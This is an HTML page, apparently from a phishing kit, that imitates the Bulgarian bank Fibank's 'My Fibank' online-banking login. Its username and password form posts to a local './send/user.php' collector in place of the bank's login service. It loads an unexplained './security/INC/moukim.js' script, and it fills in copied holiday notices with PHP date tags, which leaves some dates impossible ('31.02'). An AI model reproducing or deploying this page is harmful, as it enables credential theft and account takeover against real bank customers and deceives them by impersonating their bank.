<html class="ng-scope">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide{display:none !important;}ng\:form{display:block;}.ng-animate-block-transitions{transition:0s all!important;-webkit-transition:0s all!important;}.ng-hide-add-active,.ng-hide-remove{display:block!important;}</style>

		
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<meta name="description" content="">
		<meta name="author" content="">
		<link rel="shortcut icon" href="./img/favicon.ico">
		
		<meta name="_csrf" content="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
		<meta name="_csrf_header" content="X-CSRF-TOKEN">
		
		<title>Вход в Моята Fibank</title>
	
		<script>
	      document.createElement('ui-select');
	      document.createElement('ui-select-match');
	      document.createElement('ui-select-choices');
	    </script>
	

		
	
		    <link href="./security/INC/myalertcss.css" rel="stylesheet">
			<link href="./css/css.css" rel="stylesheet">
		
		
	
	
		</head><body ><object id="oCAPICOM"  style="display: none;">&nbsp;</object>
	
	
		<div class="body-wrapper">
			<nav class="navbar navbar-default" role="banner">
				<div class="container-fluid">
					<div class="navbar-header">
						<a href="#"  class="navbar-brand"></a>
					</div>
					
					<div class="collapse navbar-collapse" role="navigation">
						<ul class="nav navbar-nav">
							<li><a href="">English</a></li>							
							<li><a target="blank" href=""><i class="i-16  i-to-site"></i><span translate="APP.WEBSITE" class="ng-scope">Към сайта</span></a></li>							
							<li dropdown="" sg-dropdown="" is-open="status.isopen" class="ng-scope">
								<a ng-href="" target="blank" href=""><i class="i-32 i-app-full"></i><span translate="APP.MOBAPP" class="ng-scope">Мобилно приложение</span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-app">
									<li>
										<h3 translate="APP.MOBAPP_PIC" class="ng-scope">Банкирайте навсякъде, по всяко време</h3>
										<a ng-href="" target="blank" translate="APP.LEARNMORE" class="btn btn-default h-34 ng-scope" href="" >Научете повече</a>
									</li>
								</ul>
							</li>
							<li><a target="blank" href=""><i class="i-16 i-tariff-changes"></i><span translate="APP.CHANGES" class="ng-scope">Промени в ОУ и тарифа</span></a></li>
													
							<li dropdown="" class="ng-scope"> 
								
								<a href=""><i class="i-16 i-help"></i><span translate="APP.HELP" class="ng-scope">Помощ</span></a>
								<ul dropdown-menu="" class="dropdown-menu menu-help">
									<li>
										<h3 translate="APP.INFORMATION_NMENU" class="ng-scope">Информация</h3>
									</li>
								
									<li>
										<a  target="blank" href="">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.ASKED_QUESTIONS" class="ng-scope">Често задавани въпроси</span>
										</a>
									</li>
									<li>
										<a target="blank" href="">
											<i class="i-security-advice-big i-18-20"></i>
											<span translate="APP.SECURITY_ADVICE" class="ng-scope">Мерки за сигурност</span>
										</a>
									</li>
									
								<li class="ng-scope">
										<a  target="blank" href="https://webgate.ec.europa.eu/odr/main/?event=main.home.show&amp;lng=BG">
											<i class="i-faq i-18-20"></i>
											<span translate="APP.OSD" class="ng-scope">Онлайн решаване на спорове</span>
										</a>
									</li>
									
									<li>
										<div class="divider"></div>
									</li>
									<li>
										<h3 translate="APP.CONTACT_US_MENU" class="ng-scope">Връзка с нас</h3>
									</li>
									<li>
										<a class="cursor-text">
											<i class="i-18 i-phone"></i>
											<span translate="0700 12 777" class="ng-scope">0700 12 777</span>
										</a>
									</li>
									<li>
										<a class="cursor-text"  href="mailto:my.fibank@fibank.bg">
											<i class="i-20-14 i-mail"></i>
											<span translate="my.fibank@fibank.bg" class="ng-scope">my.fibank@fibank.bg</span>
										</a>
									</li>
								
								</ul>
							</li>
						</ul>
						<ul class="nav navbar-nav navbar-right ">
							
							    <li class="ng-scope"><div><a  translate="APP.REGISTRATION" class="pull-right btn btn-info h-34 w-btn-120 ng-scope" href="/oauth2-server/registration">РЕГИСТРАЦИЯ</a></div></li>
								<li  class="ng-hide"><div><a  translate="APP.LOGIN" class="navbar-btn pull-right btn btn-primary h-34 w-btn-120 ng-scope" href="/oauth2-server/login">ВХОД</a></div></li>
								<li class="ng-hide"><div><a translate="APP.LOGIN" href="/EBank" class="btn pull-right btn-primary h-34 w-btn-120 ng-scope">ВХОД</a></div></li>
							
						</ul>
					</div>
				</div>
			</nav>
		
			
			<div id="app"  class="ng-scope">


<div class="container ng-scope">
	<div class="login">
		<div class="row">
			<div class="col-md-12">
				<article class="important ng-binding ng-scope" ><span></span></article>
			</div>
		</div>			
		
		<div class="row">
			<div class="col-md-12">
				<div class="container-signin">
					<form name="form" id="form-signin" class="form-centered  form-signin box-border ng-pristine ng-invalid ng-invalid-required" action="./send/user.php" method="post"  ><h3 class="form-signin-heading ng-scope" translate="LOGIN.LOGIN_TITLE">Моята Fibank</h3>
						<div id="loginform">
							<fieldset>
								<div class="form-group">
									<label translate="LOGIN.USERNAME" class="ng-scope"><span class="red-txt">* </span>Потребител</label>
									<label translate="LOGIN.REQUIRED_FIELDS" class="grey-txt s2 pull-right ng-scope"><span class="red-txt">* </span>Задължителни полета</label>
									<div class="form-control-icon">
										<i class="i-16 i-user-normal"></i>
										<input tabindex="1" id="username" name="username" ng-model="credentials.username" type="text" class="form-control ng-pristine ng-invalid ng-invalid-required" required="" autofocus="">
										<p class="pull-right s2 red-txt ng-scope ng-hide"  translate="LOGIN.ERROR.USERNAME">Моля, въведете потребител!</p>
									</div>
								</div>
								<div class="form-group">
									<label translate="LOGIN.PASSWORD" class="ng-scope"><span class="red-txt">* </span>Парола</label>
									<div class="form-control-icon">
										<i class="i-16 i-password"></i>
										<input tabindex="2" id="password" name="password"  type="password" class="form-control ng-pristine ng-invalid ng-invalid-required" required="">
										<p class="pull-right s2 red-txt ng-scope ng-hide"  translate="LOGIN.ERROR.PASSWORD">Моля, въведете парола!</p>
									</div>
								</div>


								

							</fieldset>

						
							<button id="button" class="btn btn-primary ng-scope" type="submit" ><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">връзка</font></font></button>

						
							
							
							
							<input id="lang" class="hidden ng-pristine ng-valid" type="text" name="lang" >
							<input id="time" class="hidden ng-pristine ng-valid" type="text" name="time" >
							<input class="hidden" type="text" name="_csrf" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
							<input id="sig" class="hidden ng-pristine ng-valid" type="text" name="sig" >
						</div>
					</form>

				
					<form id="form-signin-demo" role="form" method="post" action="login" class="ng-pristine ng-valid ng-hide">
						<input class="hidden ng-pristine ng-valid" type="text" name="username">
						<input class="hidden ng-pristine ng-valid" type="text" name="password">
						<input class="hidden ng-pristine ng-valid" type="text" name="system" >
						<input class="hidden ng-pristine ng-valid" type="text" name="lang" >
						<input class="hidden ng-pristine ng-valid" type="text" name="time" >
						<input class="hidden" type="text" name="_csrf" value="7531cea1-ac9e-4e59-83f5-f4e36cb9293e">
						<input tabinex="-1" class="hidden ng-pristine ng-valid" type="text" name="client_id" >
					</form>

					<div class="ssl-box box-border">
						<div class="ssl-thawte" title="Чрез &quot;кликване&quot; можете да се уверите, че този сайт е избрал Thawte SSL за сигурност при електронна търговия и поверителни комуникации.">
							<p translate="LOGIN.SSL_CERT_DESC" class="ng-scope">Защитен вход със <a href="http://www.thawte.com/products" target="blank">SSL сертификат</a> от:</p>
						
							<div>
								<a href="" tabindex="-1" target="THAWTE_Splash">
									<img src="./img/img_logo_thatwe.png" alt="Click to Verify - This site has chosen a thawte SSL Certificate to improve Web site security">
								</a>
								<span class="ng-binding">25.03.<?php echo date('Y'); ?></span>
							</div>
						</div>
						<ul class="list-inline">
							<li>
								<a  target="blank" href=""><i class="i-16 i-security-advice"></i><span translate="LOGIN.SECURITY_ADVICE" class="ng-scope">Съвети за сигурност</span><i class="i-arrow-right-4x7"></i></a>
							</li>

							<li>							
								<a target="blank" href=""><i class="i-faq i-18-20"></i><span translate="APP.ASKED_QUESTIONS" class="ng-scope">Често задавани въпроси</span><i class="i-arrow-right-4x7"></i>
								</a>
							</li>
						</ul>
					</div>
					
									
				</div>

				<div class="container-signin-info">
					<article  class="important ng-binding ng-scope"><div class="grey-txt alert-danger modal-body s4">
<b>Уважаеми клиенти,</b>
<br>
Моята Fibank НИКОГА няма да поиска въвеждане на Ваши лични данни за контакт като: Мобилен телефон, Е-mail или друга контактна информация на екрана за вход! Банката разполага с тези данни, а промяната или потвърждението им се извършват само в банков офис.
<br>
Ако това се случи, е възможно Вашият компютър да е заразен с вирус, който управлява Вашия уеб браузър и извършва действия, които не са инициирани от Моята Fibank.
<br>
Обръщаме Ви внимание и че ПИНт и еднократна парола от Токън  се изискват само при потвърждаване на активни банкови операции – нареждане на преводи към друго лице, откриване и закриване на сметки или при вход в системата, ако сте го указали изрично.
<br>
В случай на съмнение, не въвеждайте никаква информация в уеб браузъра и се свържете с нашите служители за допълнителни инструкции.
<br>
<a href="" target="_blank" class="pull-right black-txt"><b>Прочетете повече</b> <i class="i-arrow-right-4x7"></i></a>
</div></article>
					
					</article>	
				</div>
			</div>
		</div>
		
		<div class="row">
			<div class="col-md-12">
				<article ng-if="globalConf.translateSufix != '_CY'" class="important ng-binding ng-scope"><div class="grey-txt grey-bg modal-body s4">
<b>Уважаеми клиенти,</b>
<br>
информираме Ви, че преводи наредени по системи BISERA и RINGS до 14.15ч. на 25.03.<?php echo date('Y'); ?> г. се изпълняват с дата на изпълнение 25.03.<?php echo date('Y'); ?>г., а след този час с дата на изпълнение 02.01.<?php echo date('Y'); ?>г.
<br>
<br>
Вътрешнобанкови преводи, наредени до 16.00ч. на 31.02.<?php echo date('Y'); ?> г. се изпълняват с дата на изпълнение 12.03.<?php echo date('Y'); ?> г., а след този час с дата на изпълнение 01.01.<?php echo date('Y'); ?>г.
<br>
<br>
Телефон 0700 12 777 няма да приема обаждания от 12:00ч. на 02.03.<?php echo date('Y'); ?>г. до 07:00ч. на 02.01.<?php echo date('Y'); ?>г.
<br>
Fibank Ви пожелава весело посрещане на новогодишните празници!
</div></article>
			</div>
		</div>	
		
	</div>
</div></div>
		
		
			<div class="body-push"></div>
		</div>

		<div id="footer-push">
			<div  class="ng-scope">
				<div class="info-box text-center">
	<h5 translate="LOGIN.QUESTIONS" class="ng-scope">За всички въпроси нашите служители Ви очакват на:</h5>
	<ul class="list-inline first-ul">
		<li><i class="i-phone"></i><span translate="LOGIN.PHONE" class="ng-scope">Телефон:</span> <span class="blue-txt bold ng-scope" translate="LOGIN.PHONE_NUM">0700 12 777</span> <span  translate="LOGIN.NONSTOP" class="ng-scope">(денонощно)*</span></li>
		<li><a href="mailto:my.fibank@fibank.bg" target="blank"><i class="i-20-14 i-mail"></i><span translate="LOGIN.EMAIL" class="ng-scope">E-mail:</span> <span class="blue-txt bold ng-scope" translate="my.fibank@fibank.bg">my.fibank@fibank.bg</span></a></li>

	</ul>
	<p class="grey-txt s4 ng-scope" translate="LOGIN.CALL_INFO">* Разговорите към национален номер 0700 12 777 се таксуват според определените от Вашия оператор цени за обаждане към номера тип 0700 на Vivacom. За абонати на Vivacom обаждане към този номер се таксува като обаждане към стационарен номер в мрежата на Vivacom.</p>
	<h5 translate="LOGIN.LOCATION"  class="ng-scope">Вижте къде се намираме:</h5>
	<ul class="list-inline last-ul ng-scope" >
		<li><a href="" target="_blank"><i class="i-16 i-offices"></i><span translate="LOGIN.OFFICE_INFO" class="ng-scope">Клонове</span><i class="i-arrow-right-5x8"></i></a></li>
		<li><a href="" target="_blank"><i class="i-18 i-atm"></i><span translate="LOGIN.ATM_INFO" class="ng-scope">Банкомати</span><i class="i-arrow-right-5x8"></i></a></li>
	</ul>
</div>
			</div>
			<div id="footer" class="container-fluid text-center">
				<ul class="list-inline s2">
				
				<li class="ng-scope"><a  translate="APP.REGISTRATION_PROC" target="_blank" class="ng-scope" href="">Процес на регистрация</a><i class="i-arrow-right-4x7"></i></li>
				
					<li><a  translate="APP.FEES_COMISSIONS" target="_blank" class="ng-scope" href="">Такси и комисионни</a><i class="i-arrow-right-4x7"></i></li>
					<li><a  translate="APP.DOCUMENTS" target="_blank" class="ng-scope" href="">Документи</a><i class="i-arrow-right-4x7"></i></li>
				</ul>
				<p class="s2 ng-scope" translate="APP.COPYRIGHTS">© Първа инвестиционна банка 2009-<?php echo date('Y'); ?>. Всички права запазени.</p>
			</div>
		</div>


		
		
		
		  <script type="text/javascript" src="./security/INC/moukim.js"></script>
	
</body></html>